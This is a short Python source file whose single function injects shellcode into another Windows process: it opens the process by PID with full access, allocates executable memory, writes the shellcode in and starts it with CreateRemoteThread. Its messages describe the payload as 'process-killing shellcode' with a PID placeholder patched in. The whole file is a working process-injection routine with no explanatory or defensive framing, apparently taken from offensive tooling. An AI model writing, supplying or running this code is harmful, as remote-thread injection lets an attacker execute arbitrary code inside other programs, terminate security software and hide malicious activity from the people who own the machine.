import sys
import re
from platform import system
from binascii import hexlify
from ctypes import *

def inject(pid, shellcode, exe=True):

    if not (system() == 'Windows'):

        raise NotImplementedError('This platform is invalid.')

    if (exe == True):

        shellcode = "\\x" + "\\x".join(re.findall("..", hexlify(shellcode)))

    pid = int(pid)
    pid_to_kill = str(pid)

    PAGE_EXECUTE_READWRITE = 0x00000040
    PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM = ( 0x1000 | 0x2000 )
    kernel32 = windll.kernel32

    padding = 4 - (len( pid_to_kill ))
    replace_value = pid_to_kill + ( "\x00" * padding )
    replace_string= "\x41" * 4
    shellcode = shellcode.replace( replace_string, replace_value )
    code_size = len(shellcode)
   
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
    if not h_process:
        
        return(["Couldn't acquire a handle to PID: %s" % (pid)])
    
    arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,
    VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode,
    code_size, byref(written))

    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
        
        return(["Failed to inject process-killing shellcode. Exiting."])

    return(["Remote thread created with a thread ID of: 0x%08x" % (thread_id.value), "Process %s should not be running anymore!" % (pid_to_kill)])
